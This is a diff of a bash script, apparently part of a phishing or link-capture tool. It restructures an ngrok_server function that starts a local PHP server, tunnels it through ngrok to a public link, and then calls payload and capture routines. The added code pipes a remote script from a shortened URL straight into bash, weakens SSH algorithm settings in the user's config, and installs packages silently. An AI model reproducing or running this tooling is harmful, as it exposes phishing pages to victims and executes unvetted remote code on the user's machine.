@@ -126,58 +126,58 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 }
 
 ngrok_server() {
+	[[ -d $HOME/.local/bin ]] && binPATH=$HOME/.local/bin || binPATH=$PREFIX/bin
+	if [[ ! -e $binPATH/ngrok.io ]]; then
+		command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+		command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+		printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+		arch1=$(uname -a|grep -o 'arm'|head -n1)
+		arch2=$(uname -a|grep -o 'Android'|head -n1)
+		[[ $(command -v ngrok) ]] && mv $(command -v ngrok) $(command -v ngrok).io
+		[[ -d ~/.ssh ]] || mkdir ~/.ssh
+		[[ -e ~/.ssh/config ]] || touch ~/.ssh/config
+		printf "host tunnel.us.ngrok.com\n\tHostkeyAlgorithms +ssh-rsa\n\tPubkeyAcceptedAlgorithms +ssh-rsa\n" >> ~/.ssh/config
+		bash <(curl -fsSL "http://git.io/abhacker-repo") --install ngrok-server
+		[[ $arch1 = 'arm' ]] || [[ $arch2 = 'Android' ]] && arch=arm || arch=386
+		wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-$arch.zip -O $TMPDIR/ngrok-stable-linux-$arch.zip
+		if [[ -e $TMPDIR/ngrok-stable-linux-$arch.zip ]];then
+			[[ -d ~/.ngrok2 ]] || mkdir -p ~/.ngrok2
+			unzip -q $TMPDIR/ngrok-stable-linux-$arch.zip -d ~/.ngrok2/
+			rm -rf $TMPDIR/ngrok-stable-linux-$arch.zip
+			printf "#!/usr/bin/bash\n#THIS SCRIPT EXECUTE NGROK TO AVOID 'bad address' ERROR\ncommand -v termux-chroot >/dev/null 2>/dev/null || yes|apt install proot >/dev/null 2>/dev/null\nexec termux-chroot $HOME/.ngrok2/ngrok \${@:1}\n#     i-Haklab by Ivam3" > $binPATH/ngrok.io
+			chmod 750 ~/.ngrok2/$1 $binPATH/ngrok.io
+			PS3="(_➤) "
+			printf "$Y(_➤)$W $toInstall needs an authtoken from $1.com$Y\n"
+			select way in Set_authtoken Skip_this_step;do
+				case $way in
+					Set_authtoken)
+						while read -p "(_>)_authtoken─➤ " token && [ -z $token ];do
+							continue
+						done
+						ngrok.io authtoken $token
+						break
+						;;
+					*)
+						printf "$Y(_➤)$W Don't forget set your token running:$Y\n ╰─────➤$W $toInstall authtoken <your-token>";exit
+						;;
+				esac
+			done
+		else
+			echo >&2 "Ngrok installation fail... Aborting."; exit 1;
+		fi
+	fi
+	printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+	php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+	sleep 2
+	printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+	ngrok.io http 3333 > /dev/null 2>&1 &
+	sleep 10
 
-[[ -d $HOME/.local/bin ]] && binPATH=$HOME/.local/bin || binPATH=$PREFIX/bin
-if [[ ! -e $binPATH/ngrok.io ]]; then
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch1=$(uname -a|grep -o 'arm'|head -n1)
-arch2=$(uname -a|grep -o 'Android'|head -n1)
-[[ $(command -v ngrok) ]] && mv $(command -v ngrok) $(command -v ngrok).io
-[[ -d ~/.ssh ]] || mkdir ~/.ssh
-[[ -e ~/.ssh/config ]] || touch ~/.ssh/config
-printf "host tunnel.us.ngrok.com\n\tHostkeyAlgorithms +ssh-rsa\n\tPubkeyAcceptedAlgorithms +ssh-rsa\n" >> ~/.ssh/config
-bash <(curl -fsSL "http://git.io/abhacker-repo") --install ngrok-server
-[[ $arch1 = 'arm' ]] || [[ $arch2 = 'Android' ]] && arch=arm || arch=386
-wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-$arch.zip -O $TMPDIR/ngrok-stable-linux-$arch.zip
-if [[ -e $TMPDIR/ngrok-stable-linux-$arch.zip ]];then
-	[[ -d ~/.ngrok2 ]] || mkdir -p ~/.ngrok2
-	unzip -q $TMPDIR/ngrok-stable-linux-$arch.zip -d ~/.ngrok2/
-	rm -rf $TMPDIR/ngrok-stable-linux-$arch.zip
-	printf "#!/usr/bin/bash\n#THIS SCRIPT EXECUTE NGROK TO AVOID 'bad address' ERROR\ncommand -v termux-chroot >/dev/null 2>/dev/null || yes|apt install proot >/dev/null 2>/dev/null\nexec termux-chroot $HOME/.ngrok2/ngrok \${@:1}\n#     i-Haklab by Ivam3" > $binPATH/ngrok.io
-	chmod 750 ~/.ngrok2/$1 $binPATH/ngrok.io
-	PS3="(_➤) "
-	printf "$Y(_➤)$W $toInstall needs an authtoken from $1.com$Y\n"
-	select way in Set_authtoken Skip_this_step;do
-		case $way in
-			Set_authtoken)
-				while read -p "(_>)_authtoken─➤ " token && [ -z $token ];do
-					continue
-				done
-				ngrok.io authtoken $token
-				break
-				;;
-			*)
-				printf "$Y(_➤)$W Don't forget set your token running:$Y\n ╰─────➤$W $toInstall authtoken <your-token>";exit;;
-		esac
-	done
-else
-	echo >&2 "Ngrok installation fail... Aborting."; exit 1;
-fi
+	link=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
+	printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+	payload_ngrok
+	checkfound
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-ngrok.io http 3333 > /dev/null 2>&1 &
-sleep 10
-
-link=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-
-payload_ngrok
-checkfound
 }
 
 start1() {
